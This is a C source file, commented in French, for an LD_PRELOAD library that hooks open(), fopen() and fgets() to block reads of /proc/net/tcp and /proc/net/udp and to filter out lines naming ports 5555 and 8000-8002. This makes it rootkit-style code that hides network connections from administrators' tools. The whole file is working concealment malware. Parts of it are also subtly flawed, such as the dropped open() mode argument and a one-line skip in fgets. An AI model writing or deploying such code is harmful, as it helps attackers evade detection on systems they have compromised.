#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>  

// Ports cachés (en hexadécimal et en décimal)
const char *hidden_ports[] = {"15B3", "5555", "1F40", "8000", "1F41", "8001", "1F42", "8002", NULL};

// Pointeurs vers les vraies fonctions
static int (*orig_open)(const char *, int, ...) = NULL;
static FILE *(*orig_fopen)(const char *, const char *) = NULL;
static char *(*orig_fgets)(char *, int, FILE *) = NULL;

// Hook pour `open()` : bloque l'accès aux fichiers réseaux
int open(const char *pathname, int flags, ...) {
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");

    if (strstr(pathname, "/proc/net/tcp") || strstr(pathname, "/proc/net/udp")) {
        errno = ENOENT;  
        return -1; // Bloque l'accès
    }

    return orig_open(pathname, flags);
}

// Hook pour `fopen()` : bloque l'accès à certains fichiers réseau
FILE *fopen(const char *pathname, const char *mode) {
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, "/proc/net/tcp") || strstr(pathname, "/proc/net/udp")) {
        errno = ENOENT;  
        return NULL; // Empêche l'ouverture du fichier
    }

    return orig_fopen(pathname, mode);
}

// Hook pour `fgets()` : filtre les lignes contenant les ports cachés
char *fgets(char *str, int size, FILE *stream) {
    if (!orig_fgets) orig_fgets = dlsym(RTLD_NEXT, "fgets");

    char *result;
    do {
        result = orig_fgets(str, size, stream);
        if (result == NULL) return NULL;

        for (const char **hidden = hidden_ports; *hidden != NULL; hidden++) {
            if (strstr(str, *hidden)) return orig_fgets(str, size, stream); // Ignore la ligne 
        }

    } while (0);

    return result;
}
